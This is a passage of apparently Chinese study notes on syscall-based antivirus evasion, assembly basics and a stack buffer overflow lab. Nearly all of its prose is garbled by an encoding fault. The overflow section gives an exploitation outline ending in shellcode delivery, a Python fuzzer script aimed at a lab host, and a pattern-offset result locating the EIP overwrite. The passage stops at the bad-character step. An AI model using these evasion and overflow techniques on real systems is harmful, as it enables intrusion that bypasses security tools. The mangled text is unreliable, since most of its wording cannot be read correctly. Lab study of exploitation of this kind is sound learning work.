- å®šä¹‰è¦ä½¿ç”¨çš„åŸç”Ÿå‡½æ•°çš„syscallçš„åœ°å€æŒ‡é’ˆï¼Œå¹¶è®¾ç½®ä»ntdllä¸­è·å–åˆ°çš„å‡½æ•°æŒ‡é’ˆåœ°å€ï¼Œ0x12çš„åç§»é‡ã€‚è¿™æ˜¯å› ä¸ºè¦è·å–å‡½æ•°åˆå§‹åœ°å€åˆ°syscallçš„åœ°å€ï¼Œè¿™ä¹Ÿæ˜¯é—´æ¥syscallçš„æ ¸å¿ƒâ€”â€”â€”â€”ç»•è¿‡Win32 APIåˆ°æ‰¾åŸç”ŸAPIçš„è¿‡ç¨‹ï¼Œå»è°ƒç”¨å‡½æ•°åŸæœ¬çš„syscallï¼Œç›´æ¥syscallåˆ™æ˜¯æ—¢ç»•è¿‡Win32 APIåˆ°æ‰¾åŸç”ŸAPIï¼Œåˆç»•è¿‡å‡½æ•°åŸç”Ÿçš„syscallã€‚

</code></pre>
<p><img alt="" src="../../images/20230915114659.png" /></p>
<h3 id="syscall_5">syscallç»•è¿‡çš„ç¼ºé™·</h3>
<ul>
<li>ç”±äºå›ºå®šäº†syscallçš„è°ƒç”¨ä»£ç ï¼Œæ±‡ç¼–æŒ‡ä»¤çš„ç‰¹å¾ä¼šè¢«é™æ€ç›‘æµ‹åˆ°ã€‚</li>
</ul>
<p><img alt="" src="../../images/20230915160923.png" />
<img alt="" src="../../images/20230915161029.png" /></p>
<ul>
<li>å®ç°ç»•è¿‡æ€è½¯é™¤äº†ä½¿ç”¨syscallå¤–ï¼Œè¿˜éœ€è¦è§£å†³å…¶ä»–çš„é—®é¢˜æ¯”å¦‚å…¶ä»–api hooké—®é¢˜ã€shellcodeå†…å­˜åˆ†é…é—®é¢˜ã€å…¨æ ˆè¡Œä¸ºå¼‚å¸¸é—®é¢˜ã€‚ç®€å•è¯´æ˜¯éœ€è¦ç»“åˆå„ç§æ‰‹æ®µæ¨¡æ‹Ÿå‡ºçœŸå®çš„ç¨‹åºè¿è¡Œçš„å†…å­˜è°ƒç”¨ï¼Œä»¥è¾¾æˆæœ€å¥½çš„å…æ€æ•ˆæœã€‚</li>
</ul>
<h2 id="_6">æ±‡ç¼–</h2>
<h3 id="_7">è¯­æ³•é£æ ¼</h3>
<p>æ ¹æ®è¯­æ³•é£æ ¼åˆ†æˆIntelå’ŒAT&amp;Tï¼ŒWindowsç”¨çš„æ˜¯Inter</p>
<pre><code>Interå’ŒAT&amp;TåŒºåˆ«å¦‚ä¸‹
- Interè¯­æ³•æ˜¯ &lt;æŒ‡ä»¤ ç›®æ ‡,æº&gt;ï¼›AT&amp;Tè¯­æ³•æ˜¯&lt;æŒ‡ä»¤ æº;ç›®æ ‡&gt;
- AT&amp;Tè¯­æ³•åœ¨æ³¨å†Œåç§°ä¹‹å‰å¿…é¡»å†™ç™¾åˆ†å·(%)ï¼Œæ•°å­—ä¹‹å‰å†™ç¾å…ƒå·($)ã€‚åœ°å€ä½¿ç”¨åœ†æ‹¬å·ã€‚
- AT&amp;Tè¯­æ³•åœ¨æŒ‡ä»¤ä¸­æ·»åŠ åç¼€æ¥å®šä¹‰æ“ä½œæ•°çš„å¤§å°
q - quad 64bits 8bytes   
l - long 32bits 4bytes   
w - word 16bits 2bytes   
b - byte 8bits  1bytes

</code></pre>
<h3 id="_8">å‡½æ•°çš„æµç¨‹</h3>
<p>æ±‡ç¼–ä¸­çš„å‡½æ•°ç‰¹å¾éå¸¸æ˜æ˜¾ï¼Œå¼„æ¸…é™¤å‡½æ•°çš„åŠŸèƒ½æ˜¯éå¸¸å…³é”®çš„</p>
<pre><code>1. è°ƒç”¨è€…å°†è¢«è°ƒå‡½æ•°æ‰€éœ€çš„å‚æ•°æ”¾å…¥æŒ‡å®šä½ç½®ï¼Œæ ¹æ®è°ƒç”¨çº¦å®šä¸åŒï¼Œä½ç½®ä¸åŒï¼Œæœ‰çš„æ”¾å…¥å¯„å­˜å™¨ï¼Œæœ‰çš„å…¨æ”¾å…¥æ ˆ
2. CALLæŒ‡ä»¤è·³è½¬åˆ°æŒ‡å®šå‡½æ•°
3. è¢«è°ƒå‡½æ•°é…ç½®ä¸€ä¸ªæŒ‡é’ˆç”¨æ¥ä¿å­˜ä¿æŒä¸å˜çš„å¯„å­˜å™¨å€¼
4. ä¸ºè¢«è°ƒå‡½æ•°å±€éƒ¨å˜é‡åœ¨æ ˆä¸Šåˆ†é…ç©ºé—´ï¼ŒPUSHæŒ‡ä»¤
5. è¢«è°ƒå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ï¼Œè®¿é—®å‚å¯„å­˜å™¨çš„å‚æ•°ï¼Œå¹¶ç»™å¯„å­˜å™¨è¿”å›ç»“æœ
6. è¢«è°ƒå‡½æ•°æ‰§è¡Œå®Œæˆåï¼Œé‡Šæ”¾æ ˆç©ºé—´ï¼ŒPOPæŒ‡ä»¤
7. è¿˜åŸç¬¬3æ­¥ä¸­çš„å€¼
8. å‡½æ•°è¿”å›ï¼ŒRETæŒ‡ä»¤
9. è°ƒç”¨è€…è¿˜åŸå¯„å­˜å™¨çš„å€¼

3-4å±äºå‡½æ•°åºè¨€
6-8å±äºå‡½æ•°å°¾å£°


</code></pre>
<h3 id="_9">å‡½æ•°åºè¨€å’Œå°¾å£°</h3>
<pre><code>å‡½æ•°åºè¨€(function prolog)æ˜¯å‡½æ•°å¼€å§‹æ—¶çš„æŒ‡ä»¤åºåˆ—ï¼Œä¸ºäº†EBPä¸­çš„å€¼åœ¨å‡½æ•°æ‰§è¡ŒæœŸé—´ä¿æŒä¸å˜ï¼Œå¥½è®©EBPå¯ä»¥ç”¨äºè®¿é—®å±€éƒ¨å˜é‡å’Œå‚æ•°ã€‚å®ƒé€šå¸¸çœ‹èµ·æ¥åƒä¸‹é¢çš„ä»£ç ç‰‡æ®µ:
push ebp
mov ebp, esp
sub esp, X

å‡½æ•°å°¾å£°é‡Šæ”¾æ ˆä¸­åˆ†é…çš„ç©ºé—´ï¼Œå°†EBPå¯„å­˜å™¨ä¸­çš„å€¼è¿”å›åˆ°å…¶åˆå§‹çŠ¶æ€ï¼Œå¹¶å°†æ§åˆ¶æµè¿”å›ç»™è°ƒç”¨è€…
mov esp, ebp
pop ebp
ret 0

å‡½æ•°åºè¨€å’Œå°¾å£°é€šå¸¸åœ¨åæ±‡ç¼–ç¨‹åºä¸­æ£€æµ‹ï¼Œç”¨äºå‡½æ•°å®šç•Œ

</code></pre>
<p>ä¸‹é¢æ˜¯åœ¨linuxä¸Šç”Ÿäº§çš„æ±‡ç¼–ç 
<img alt="" src="../../images/20230921103440.png" /></p>
<h3 id="_10">å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡</h3>
<p>åœ¨æ±‡ç¼–ä¸­å…¨å±€å˜é‡ä¼šè¢«è‡ªåŠ¨åˆå§‹åŒ–ä¸º0ï¼Œå±€éƒ¨å˜é‡ä¸ä¼š</p>
<h3 id="_11">å¯„å­˜å™¨</h3>
<p><strong>General Purpose Registers (GPR)</strong></p>
<pre><code>RAX - accumulator register ç´¯åŠ å™¨å¯„å­˜å™¨ã€‚é€šå¸¸ç”¨äºå­˜å‚¨å‡½æ•°çš„è¿”å›å€¼
RBX - base register åŸºç¡€å¯„å­˜å™¨ã€‚æœ‰æ—¶ç”¨ä½œå†…å­˜è®¿é—®çš„åŸºå‡†æŒ‡é’ˆ
RDX - data register æ•°æ®å¯„å­˜å™¨
RCX - counter register æœ‰æ—¶è¢«ç§°ä¸ºè®¡æ•°å™¨å¯„å­˜å™¨ã€‚ç”¨ä½œå¾ªç¯è®¡æ•°å™¨

RSI - source index è¢«ç§°ä¸ºæºç´¢å¼•ã€‚ç”¨äºå­—ç¬¦ä¸²æ“ä½œçš„æºæŒ‡é’ˆã€‚
RDI - destination index ç§°ä¸ºç›®æ ‡ç´¢å¼•ã€‚åœ¨å­—ç¬¦ä¸²æ“ä½œä¸­ç”¨ä½œç›®æ ‡æŒ‡é’ˆ

RSP - stack pointer æ ˆæŒ‡é’ˆã€‚ä¿å­˜æ ˆé¡¶éƒ¨çš„åœ°å€ã€‚
RBP - base pointer åŸºæŒ‡é’ˆã€‚ä¿å­˜å †æ ˆåº•éƒ¨çš„åœ°å€ã€‚
EIP/RIP - Instruction Pointer  æŒ‡ä»¤æŒ‡é’ˆã€‚ä¿å­˜ä¸‹ä¸€è¡Œè¦æ‰§è¡Œä»£ç çš„åœ°å€

</code></pre>
<h4 id="_12">ä¸åŒä½æ•°çš„å¯„å­˜å™¨</h4>
<pre><code>CPUæ˜¯ä¸€æ­¥æ­¥è¿›åŒ–è€Œæ¥çš„ï¼Œæ‰€ä»¥é’ˆå¯¹ä¸åŒä½æ•°æœ‰ä¸åŒçš„å¯„å­˜å™¨ã€‚
Rå¼€å¤´çš„å¯„å­˜å™¨æ˜¯64ä½ç¨‹åºçš„     å¤§å°8å­—èŠ‚
Eå¼€å¤´çš„å¯„å­˜å™¨æ˜¯32ä½ç¨‹åºçš„     å¤§å°4å­—èŠ‚
Aå¼€å¤´çš„å¯„å­˜å™¨æ˜¯16ä½ç¨‹åºçš„     å¤§å°2å­—èŠ‚

åœ¨ä¸€ä¸ª64ä½ç¨‹åºä¸­ï¼ŒåŒæ—¶å­˜åœ¨64ä½ã€32ä½ã€16ä½ã€8ä½å¯„å­˜å™¨ã€‚
æ¯”å¦‚ï¼Œ64ä½ä¸­RAXçš„å32ä½ä¸ºEAXï¼Œå16ä½ä¸ºAXï¼ˆ16ä½ä¸ºé«˜ä½AHå’Œä½ä½ALç»„æˆï¼‰

</code></pre>
<h4 id="_13">å­˜å‚¨æµ®ç‚¹æ•°çš„å¯„å­˜å™¨</h4>
<p>æµ®ç‚¹æ•°å€¼è¢«å­˜å‚¨åœ¨<code>YMM*</code>å¯„å­˜å™¨ä¸­ï¼Œå¯¹åº”çš„32ä½å¯„å­˜å™¨æ˜¯<code>XMM*</code></p>
<h4 id="_14">å­˜å‚¨æ•´å½¢çš„å¯„å­˜å™¨</h4>
<p>R8 è‡³ R15å¯„å­˜å™¨ç”¨æ¥å­˜å‚¨æ•´å½¢</p>
<h3 id="_15">å†…å­˜æ•°æ®ç»“æ„</h3>
<h4 id="_16">å†…å­˜ç»“æ„</h4>
<pre><code>Stack  æ ˆ
Heap   å †
.data  åŒ…å«åˆå§‹åŒ–ä¸ºéé›¶å€¼çš„å…¨å±€å’Œé™æ€æ•°æ®
.bss   åŒ…å«æœªåˆå§‹åŒ–æˆ–åˆå§‹åŒ–ä¸ºé›¶çš„å…¨å±€å’Œé™æ€æ•°æ®
.text  åŒ…å«ç¨‹åºçš„ä»£ç 

</code></pre>
<p><img alt="" src="../../images/20230918122448.png" /></p>
<p>ä¸Šå›¾çš„ä»‹ç»</p>
<pre><code>æ ˆ - å­˜å‚¨å›ºå®šå¤§å°æ•°æ®ï¼Œåè¿›å…ˆå‡ºåŸåˆ™ï¼Œå…¥æ ˆRSPä¼šå¢åŠ ï¼Œå‡ºæ ˆRSPä¼šå‡å°ï¼ŒRBPå§‹ç»ˆä¸å˜
å † - å¯å˜çš„å­˜å‚¨ç©ºé—´
ç¨‹åºé•œåƒ - è½½å…¥åˆ°å†…å­˜ä¸­çš„PEæ–‡ä»¶
TEB - çº¿ç¨‹ç¯å¢ƒå—
PEB - è¿›ç¨‹ç¯å¢ƒå—

</code></pre>
<h4 id="_17">æ ˆå¸§</h4>
<p>æ ˆçš„åŸºç¡€å•å…ƒ</p>
<h4 id="_18">ç«¯åº</h4>
<p>ä¸€ç§å†…å­˜æ•°æ®çš„æ’åˆ—æ–¹å¼ï¼Œè¿™å°†å½±å“åˆ°è°ƒè¯•è¿‡ç¨‹ä¸­çœ‹åˆ°å†…å­˜çš„æ•°æ®é¡ºåºé—®é¢˜ï¼Œé»˜è®¤æ˜¯é‡‡ç”¨å°ç«¯åºæ¥åœ¨å†…å­˜ä¸­å­˜å‚¨æ•°æ®çš„ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåœ¨å†…å­˜ä¸­çœ‹åˆ°çš„æ•°æ®å’Œå®é™…çš„æ•°æ®æ˜¯ç›¸åçš„
å¤§ç«¯åºï¼š å°å€¼å­˜é«˜ä½ï¼Œå¤§å€¼å­˜ä½ä½
å°ç«¯åºï¼š å¤§å€¼å­˜ä½ä½ï¼Œå°å€¼å­˜é«˜ä½</p>
<h4 id="_19">æ ˆ</h4>
<p>æ ˆçš„å¢é•¿æ˜¯ä»å¤§åˆ°å°çš„ï¼Œæ ˆåº•æ˜¯å¤§åœ°å€ï¼Œæ ˆé¡¶æ˜¯å°åœ°å€ã€‚å…¥æ ˆä¼šå‡å°æ ˆé¡¶åœ°å€ï¼Œå‡ºæ ˆä¼šå¢å¤§æ ˆé¡¶åœ°å€ã€‚
ä½¿ç”¨æ— é™å¾ªç¯é€’å½’ä¼šå¯¼è‡´æ ˆæº¢å‡º</p>
<pre><code class="language-c++">void main()
{
    main();
}

</code></pre>
<p>ç¼–è¯‘å™¨å…³é—­ä¼˜åŒ–
<img alt="" src="../../images/20230921133502.png" />
RSPåˆ°æœ€å°å€¼äº†
<img alt="" src="../../images/20230921133529.png" /></p>
<h3 id="_20">æŒ‡ä»¤</h3>
<p>ç›´æ¥å€¼ã€å¯„å­˜å™¨ã€å†…å­˜/å†…å­˜åœ°å€</p>
<p>æ±‡ç¼–æŒ‡ä»¤çš„æ ¼å¼</p>
<pre><code>æ“ä½œç¬¦ ç›®æ ‡,æº
mov RAX, 5
</code></pre>
<p>åˆ†å·<code>;</code>åé¢ä»£è¡¨æ³¨é‡Š</p>
<h4 id="_21">å¸¸è§æŒ‡ä»¤</h4>
<pre><code>MOV - å°†æºæ“ä½œæ•°ç§»åŠ¨/å­˜å‚¨åˆ°ç›®æ ‡æ“ä½œæ•°  
LEA - Load Effective Address åŠ è½½æœ‰æ•ˆåœ°å€ï¼Œä¸MOVåŠŸèƒ½ç›¸åŒï¼Œå¸¸ç”¨æ¥è®¡ç®—åœ°å€  
POSH - å…¥æ ˆ
POP - å‡ºæ ˆ

INC - åŠ 1
DEC - å‡1
ADD - ç›¸åŠ ï¼Œadd RAX, RBX å¯ä»¥çœ‹æˆ RAX += RBX
SUB - ç›¸å‡ï¼Œsub RAX, RBX å¯ä»¥çœ‹æˆ RAX -= RBX
MUL/IMUL - ç›¸ä¹˜ï¼ŒMULæ˜¯æ— ç¬¦å·ç»“æœï¼ŒIMULæ˜¯æœ‰ç¬¦å·ç»“æœ
DIV/IDIV - ç›¸é™¤ï¼Œæ— ç¬¦å·å’Œæœ‰ç¬¦å·

AL - eaxçš„ä½8ä½

TEST - æŒ‰ä½è¿›è¡ŒANDæ“ä½œï¼Œæ ¹æ®è¿ç®—ç»“æœè®¾ç½®ç¬¦å·æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½å’Œå¥‡å¶æ ‡å¿—ä½

CMP - æ¯”è¾ƒï¼Œå®é™…ä¸Šæ˜¯å‡æ³•SUBï¼Œä¸åŒçš„æ˜¯SUBä¼šæ”¹å˜ç›®æ ‡å€¼ï¼Œè€ŒCMPä¸ä¼šï¼ŒCMPæ”¹å˜çš„æ˜¯æ ‡å¿—ä½ã€‚å¦‚CMP RAX, RCX  åˆ™æ˜¯RAX=RAX-RCXï¼Œå¯¹æ ‡å¿—ä½ZFã€SFã€CF/OFäº§ç”Ÿå½±å“

RET - å¿«é€Ÿè¿”å›
NOP - å¡«å……ç¬¦

JB - æ— ç¬¦å·è®¡ç®—ï¼Œæ ¹æ®æ ‡å¿—ä½è·³è½¬
JL - æœ‰ç¬¦å·è®¡ç®—ï¼Œå°äºè·³è½¬ã€‚æ ‡å¿—ä½è·³è½¬ï¼ŒSF&lt;&gt;OFè·³è½¬
JLE - å°äºç­‰äºè·³è½¬ã€‚çœ‹æ ‡å¿—ä½æ—¶ï¼ŒZF=1 æˆ– SF&lt;&gt;OFæ—¶ è·³è½¬
JE - ç­‰äºè·³è½¬ï¼ŒZFä¸º1è·³è½¬

TEST - åœ¨ä¸¤ä¸ªæ“ä½œæ•°çš„å¯¹åº”ä½ä¹‹é—´è¿›è¡Œ AND æ“ä½œï¼Œå¹¶æ ¹æ®è¿ç®—ç»“æœè®¾ç½®ç¬¦å·æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½å’Œå¥‡å¶æ ‡å¿—ä½ã€‚
</code></pre>
<pre><code>movsxd - å¸¦ç¬¦å·æ•°çš„æ‰©å±•ã€‚å¾€å¾€æ˜¯ä¸ºäº†ä»ä½ä½å¾€é«˜ä½æ‰©å±•æ—¶éœ€è¦ï¼Œ16ä½æ‰©å±•åˆ°32ä½
</code></pre>
<pre><code>JCC - æ˜¯ä¸€ç»„æŒ‡ä»¤ï¼Œæ ¹æ®æ ‡å¿—ä½ZFåˆ¤æ–­æ˜¯å¦è·³è½¬ï¼ŒåŒ…å«JNEã€JLEã€JNZç­‰ã€‚æ˜¯ç”¨æ¥æ¯”è¾ƒå¤§å°çš„ï¼Œä½†æ˜¯å†…éƒ¨é€»è¾‘æ˜¯SUBï¼Œç„¶åæ ¹æ®æ ‡å¿—ä½è·³è½¬ï¼Œè¯¦ç»†è§ä¸‹å›¾

ä¸‹é¢æ˜¯æœ‰ç¬¦å·æ•°çš„æ“ä½œï¼Œå³åŒ…å«è´Ÿæ•°æ¯”è¾ƒ
JNE - ç›®æ ‡ä¸ç­‰äºæºæ—¶è·³è½¬ã€‚åˆ¤æ–­æ˜¯å¦ZFæ˜¯å¦ç­‰äº1ï¼ŒZFä¸º1åˆ™ç»§ç»­ï¼Œä¸º0åˆ™è·³è½¬
JLE - ç›®æ ‡å°äºç­‰äºæºæ—¶è·³è½¬
JGE - ç›®æ ‡å¤§äºç­‰äºæºæ—¶è·³è½¬

ä¸‹é¢æ˜¯æ— ç¬¦å·æ•°çš„æ“ä½œï¼Œå³ä¸åŒ…å«è´Ÿæ•°æ¯”è¾ƒ
JBE - å°äºç­‰äºè·³è½¬ï¼ŒCF=1æˆ–ZF=1è·³è½¬
JAE - å¤§äºç­‰äºè·³è½¬ï¼Œ


</code></pre>
<p><img alt="" src="../../images/20230922131052.png" /></p>
<pre><code>CALL - å‡½æ•°è°ƒç”¨ï¼Œç›¸å½“äºPUSHåJMP
RET - å‡½æ•°è¿”å›ï¼Œ ç›¸å½“äºPOPåJMP
</code></pre>
<pre><code>JMP - è·³è½¬æŒ‡ä»¤
JMPçš„æŒ‡ä»¤çš„å€¼ä»¥EBå¼€å¤´ï¼ŒEBåé¢ä»£è¡¨è·³è½¬çš„ä½ç½®ï¼Œä¿®æ”¹EBåé¢çš„å€¼ä¸º00å¯ä»¥è®©JMPä¸è·³è½¬è€Œç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤
</code></pre>
<pre><code>cdqe - æ‰©å±•eaxåˆ°raxï¼Œä»32ä½æ‰©å±•åˆ°64ä½


</code></pre>
<h4 id="_22">æŒ‡ä»¤ä¸­çš„æŒ‡é’ˆ</h4>
<p>æ–¹æ‹¬å·<code>[]</code>ä¸­çš„æ•°æ®ä»£è¡¨çš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œä½¿ç”¨<code>LEA</code>æ¥å¯¹åœ°å€è¿›è¡Œæ“ä½œ</p>
<pre><code>lea RAX, [RCX+8]    ;è¿™æ˜¯è®¡ç®—åœ°å€çš„
mov RAX, [RCX+8]    ;è¿™æ˜¯è®¡ç®—å€¼çš„
</code></pre>
<h3 id="_23">æ ‡å¿—ä½</h3>
<pre><code>ZF - Zero Flag åœ¨æ“ä½œç»“æœä¸ºé›¶æ—¶è®¾ç½®ä¸º1ã€‚å¦‚æœæ“ä½œçš„ç»“æœä¸ä¸ºé›¶ï¼Œåˆ™ä¸è®¾ç½®
CF - Carry Flag æ— ç¬¦å·æ•°å€¼ï¼Œäº§ç”Ÿå€Ÿä½å’Œè¿›ä½æ—¶ï¼Œè®¾ç½®ä¸º1
OF - Overflow Flag æœ‰ç¬¦å·æ•°å€¼ï¼Œäº§ç”Ÿå€Ÿä½å’Œé”™ä½æ—¶ï¼Œè®¾ç½®ä¸º1
SF - Sign Flag æ“ä½œç»“æœä¸ºè´Ÿæ•°æ—¶ï¼Œè®¾ç½®ä¸º1
AF? - Adjust/Auxiliary Flag ä¸CFç›¸åŒï¼Œä½†ç”¨äºBCDæ“ä½œï¼ˆBCDæ“ä½œæ˜¯ä»€ä¹ˆæ“ä½œï¼‰
PF - Parity Flag å¦‚æœå8ä½ä¸­çš„1æ˜¯å¶æ•°ä½ï¼Œåˆ™è®¾ç½®ä¸º1
TF - Trap Flag  ä¸º1æ—¶ï¼Œå…è®¸å•æ­¥æ‰§è¡Œç¨‹åº
DF - 
</code></pre>
<p>å‚è€ƒèµ„æ–™ï¼š<a href="https://www.tech-recipes.com/rx/1239/assembly-flags/">https://www.tech-recipes.com/rx/1239/assembly-flags/</a></p>
<h3 id="_24">æ±‡ç¼–ä¸­çš„æµç¨‹æ§åˆ¶</h3>
<h4 id="case">case</h4>
<p>é€šè¿‡jmpè·³è½¬ecx*4çš„åœ°å€ï¼Œæ ¹æ®$LN11@fä¸­ä¸åŒè¡¨çš„å€¼è¿›è¡Œåˆ†æ”¯é€‰æ‹©
<img alt="" src="../../images/20230922152736.png" /></p>
<p><img alt="" src="../../images/20230922152748.png" /></p>
<h4 id="for">Forå¾ªç¯</h4>
<p>forå¾ªç¯ä¸€å®šæœ‰ä¸€ä¸ªè¢«åˆå§‹åŒ–çš„å€¼ä½œä¸ºç´¢å¼•ï¼Œé€šå¸¸è¢«èµ‹ç»™ESIï¼Œç„¶åæ¯”è¾ƒESIå’Œå¦å¤–ä¸€ä¸ªå€¼ï¼Œå¹¶ä¼šè·³è½¬å›å»</p>
<h3 id="_25">æ±‡ç¼–ä¸­çš„ç®—æœ¯</h3>
<pre><code>ä¹˜æ³•é€šå¸¸ç”¨åŠ æ³•ã€å‡æ³•å’Œå·¦ç§»æ¥æ›¿ä»£
å·¦ç§»çš„åŸç†æ˜¯ï¼Œå½“è¢«ä¹˜æ•°èƒ½è¢«2é™¤å°½æ—¶ï¼Œåªéœ€è¦å†æœ€å³è¾¹åŠ ä¸Š[è¢«é™¤æ•°/2]æ•°é‡çš„0å³å¯ï¼Œè¢«é™¤æ•°æ˜¯2ã€4ã€8ã€16ã€32....è¿™äº›æ•°å­—æ—¶å¯ä»¥ä½¿ç”¨å·¦ç§»æ›¿ä»£ä¹˜æ³•

é™¤æ³•ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä½†æ˜¯æ˜¯å³ç§»ä¸”ä½ä½è¢«ä¸¢å¼ƒ

</code></pre>
<h3 id="_26">æ±‡ç¼–ä¸­çš„æµ®ç‚¹æ•°</h3>
<p>x86ä¸­çš„æµ®ç‚¹æ•°ç”±FPUæ¥å®Œæˆå¤„ç†ï¼ŒST(0)â€¦ST(7)ï¼Œæœ‰ä¸€ç»„å¯ä»¥å®¹çº³8*80å­—èŠ‚çš„æ ˆ</p>
<h3 id="_27">ç¼“å†²åŒºæº¢å‡º</h3>
<p>vscodeçš„é€‰é¡¹ä¼šé˜²æ­¢ç¼“å†²åŒºæº¢å‡º
/rtcå †æ ˆå¸§è¿è¡Œæ—¶æ£€æŸ¥
/GZå¯ç”¨å †æ ˆæ£€æŸ¥(/ rtc) </p>
<p>æ•°ç»„è¶Šç•Œè¯»å–</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
int main()
{
    int a[20];
    int i;
    for (i=0; i&lt;20; i++)
        a[i]=i*2;
    printf (&quot;a[20]=%d\n&quot;, a[20]);   //å½“aæ•°ç»„çš„ç´¢å¼•è¿˜æ²¡åˆ°20æ—¶ï¼Œè¿™é‡Œå°±è¯»å–äº†20
    return 0;
};
</code></pre>
<p>ä½¿ç”¨clç›´æ¥ç¼–è¯‘ï¼Œç¨‹åºè¿è¡Œç»“æœæ˜¯
<code>a[20]=1175513387</code>  <code>4610E92B</code></p>
<p>æ•°ç»„è¶Šç•Œå†™å…¥</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
int main()
{
    int a[20];
    int i;
    for (i=0; i&lt;30; i++)     //è¿™é‡Œå¾ªç¯ç´¢å¼•æœ€å¤§æ˜¯29
        a[i]=i;             //å¾ªç¯ç´¢å¼•èµ‹ç»™äº†æ•°ç»„çš„ç´¢å¼•ï¼Œå¾ªç¯ç´¢å¼•å¤§äºæ•°ç»„ç´¢å¼•ï¼Œå¯¼è‡´è¶Šç•Œå†™å…¥ã€‚æ ¹æœ¬ä¸å­˜åœ¨a[29]ï¼Œè¦å¦‚ä½•ç»™a[29]èµ‹å€¼å‘¢ï¼Ÿ
    return 0;
};
</code></pre>
<p>ä¸€ç›´å†™å…¥äº†29ä¸ªå€¼åˆ°æ ˆä¸­ï¼Œä½†æ˜¯ç¨‹åºä¼šåœ¨å°è¯•å¾€æ•°ç»„å†™å…¥a[21]æ—¶äº§ç”Ÿå¼‚å¸¸
<img alt="" src="../../images/20230922173434.png" /></p>
<h4 id="_28">è¶Šç•Œå†™å…¥åˆ©ç”¨</h4>
<p>å½±å“ï¼šè¶Šç•Œå†™å…¥å¯é€ æˆRCE</p>
<p>ä¸€ä¸ªåŸºç¡€çš„è¶Šç•Œå†™å…¥ç¼“å­˜æº¢å‡ºåˆ©ç”¨æ­¥éª¤</p>
<pre><code>1. æ‰¾åˆ°è§¦å‘ç¼“å­˜æº¢å‡ºçš„ç‚¹ï¼Œä¹Ÿå°±æ˜¯æ‰¾åˆ°å¯å¯¹ESPæ“ä½œçš„è¾“å…¥ç‚¹
2. æ‰¾åˆ°EIPçš„åç§»ä½ç½®ä»¥ä¾¿ä¿®æ”¹EIP
3. æ‰¾åˆ°å¯é‡å®šå‘ä»£ç æ‰§è¡Œæµçš„æŒ‡ä»¤çš„åœ°å€(jmp espã€ret espç­‰)
4. å°†EIPçš„å€¼æ›¿æ¢ä¸ºé‡å®šå‘ä»£ç æ‰§è¡Œæµè¯­å¥çš„åœ°å€
5. æ‰¾åˆ°ç¨‹åºçš„åå­—ç¬¦
6. æ„é€ æ²¡æœ‰åå­—ç¬¦çš„shellcode,åœ¨shellcodeå‰ç”¨æ•°ä¸ªnopå¡«å……é˜²æ­¢é‡å®šå‘æŒ‡ä»¤è·³è¿‡ç•Œ
7. å‘é€payload
</code></pre>
<h5 id="a">ç»ƒä¹ A</h5>
<ul>
<li>æ‰¾åˆ°å¯æ§è¾“å…¥ç‚¹çš„æº¢å‡ºè¾¹ç•Œ
ç¬¬ä¸€æ­¥éœ€è¦ææ¸…æ¥šå¤šå°‘å­—èŠ‚ä¼šé€ æˆæº¢å‡ºï¼Œæº¢å‡ºçš„è¾¹ç•Œåœ¨å“ªã€‚
è¿™é‡Œç”¨ä¸€ä¸ªç®€å•çš„æ§åˆ¶å°ç¨‹åºæ¥ä½œä¸ºç»ƒä¹ ã€‚
<img alt="" src="../../images/Snipaste_2023-10-11_12-11-15.jpg" />
ç”¨è„šæœ¬è‡ªåŠ¨åŒ–æµ‹è¯•è¿™ä¸ªè¾“å…¥ç‚¹å¯ä»¥æ¥æ”¶å¤šå¤§å­—èŠ‚çš„æ•°æ®</li>
</ul>
<pre><code class="language-py">import socket
import sys
ip = &quot;192.168.14.139&quot;
port = 31337
string = b&quot;\xfc&quot; * 10
s = socket.socket()
s.connect((ip, port))
timeout = 3 
s.settimeout(timeout)
while True:
        try:
                        print(&quot;Fuzzing with {} bytes&quot;.format(len(string)))
                        s.send(string + b&quot;\x0a\x0d&quot;)
                        string += b&quot;\xfc&quot; * 10
                        s.recv(1024)
        except:
                print(&quot;Fuzzer crashed at {} bytes&quot;.format(len(string)))
                sys.exit(0)
s.close()
</code></pre>
<p>è·‘åˆ°160å­—èŠ‚æ—¶ç¨‹åºå´©æºƒ
<img alt="" src="../../images/Snipaste_2023-10-11_12-13-58.jpg" /></p>
<ul>
<li>æ‰¾åˆ°EIPçš„åç§»é‡
EIP/RIPå¯„å­˜å™¨æ˜¯æŒ‡ä»¤æŒ‡é’ˆï¼Œä¿å­˜äº†ä¸‹ä¸€è¡Œè¦æ‰§è¡Œä»£ç çš„åœ°å€ã€‚</li>
</ul>
<p>ç”±äºæ˜¯160å­—èŠ‚ç¨‹åºäº§ç”Ÿäº†å´©æºƒï¼Œç›´æ¥è‡ªå®šä¹‰ä¸€æ®µ300å­—èŠ‚çš„æ•°æ®å‘é€ï¼Œé€šè¿‡ç¨‹åºå´©æºƒæ—¶EIPçš„å€¼æ¥æ‰¾åˆ°EIPçš„åç§»é‡
æ­¤æ—¶EIPçš„å€¼ä¸º39654138
<img alt="" src="../../images/Snipaste_2023-10-11_12-44-12.jpg" /></p>
<pre><code>â””â”€# msf-pattern_offset -l 300 -q 39654138                                               
[*] Exact match at offset 146
</code></pre>
<p>åç§»é‡æ˜¯146å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´è¾“å…¥ç‚¹çš„æœ€å¤§è¾“å…¥æ˜¯146ä¸ªå­—èŠ‚ï¼Œåœ¨æ­¤ä¹‹åæ˜¯EIPçš„åœ°å€ã€‚æ­¤æ—¶å‘é€146ä¸ªå­—èŠ‚ï¼Œå¹¶åœ¨åé¢è·Ÿä¸Š4ä¸ªå­—èŠ‚ï¼Œå°±å¯ä»¥æ§åˆ¶EIPçš„å€¼ã€‚
ç”±äºæˆ‘åœ¨146ä¸ªå­—èŠ‚åå‘é€äº†4ä¸ª<code>Z</code>ï¼Œè¿™é‡Œçš„EIPå€¼æ˜¯<code>5A5A5A5A</code>
<img alt="" src="../../images/Snipaste_2023-10-11_12-53-37.jpg" /></p>
<ul>
<li>æŸ¥æ‰¾åå­—ç¬¦
